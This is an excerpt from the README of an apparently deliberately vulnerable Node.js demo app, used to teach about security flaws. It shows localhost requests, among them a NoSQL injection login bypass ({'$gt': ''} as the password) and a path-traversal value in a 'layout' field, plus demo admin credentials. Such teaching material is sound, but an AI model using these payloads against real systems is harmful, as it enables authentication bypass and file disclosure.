# Goof - Khulnasoft's vulnerable demo app
[![Known Vulnerabilities](https://khulnasoft.com/test/github/khulnasoft/goof/badge.svg?style=flat-square)](https://khulnasoft.com/test/github/khulnasoft/goof)
...
```sh
curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username": "admin@khulnasoft.com", "password": "SuperSecretPassword"}' 'http://localhost:3001/login'
```

```sh
curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"email": "admin@khulnasoft.com", "firstname": "admin", "lastname": "admin", "country": "IL", "phone": "+972551234123",  "layout": "./../package.json"}' 'http://localhost:3001/account_details'
```
...
```sh
echo '{"username":"admin@khulnasoft.com", "password":"WrongPassword"}' | http --json $GOOF_HOST/login -v
```

And another request, as denoted with the following JSON request to sign-in as the admin user works as expected:
```sh
echo '{"username":"admin@khulnasoft.com", "password":"SuperSecretPassword"}' | http --json $GOOF_HOST/login -v
```
...
```sh
echo '{"username": "admin@khulnasoft.com", "password": {"$gt": ""}}' | http --json $GOOF_HOST/login -v
```
...
```bash
khulnasoft test --docker node:6-stretch --file=Dockerfile
```

To monitor this image and receive alerts with Khulnasoft:
```bash
khulnasoft monitor --docker node:6-stretch
```

## Runtime Alerts

Khulnasoft provides the ability to monitor application runtime behavior and detect an invocation of a function is known to be vulnerable and used within open source dependencies that the application makes use of.
